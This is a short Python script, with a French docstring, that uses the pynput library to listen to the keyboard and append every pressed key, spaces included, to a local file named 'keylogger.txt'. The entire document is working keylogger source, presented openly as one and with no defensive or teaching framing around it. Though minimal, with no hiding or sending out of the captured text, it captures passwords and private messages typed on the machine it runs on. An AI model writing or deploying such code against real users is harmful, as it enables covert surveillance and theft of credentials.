from pynput import keyboard

def onPush(key):
    """
    enregistre dans un fichier texte les touches frappes
    """

    try:
        with open("keylogger.txt","a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogger.txt","a") as f:
                f.write(" ")


if __name__ == "__main__":
    with keyboard.Listener(on_press=onPush) as listener:
        listener.join()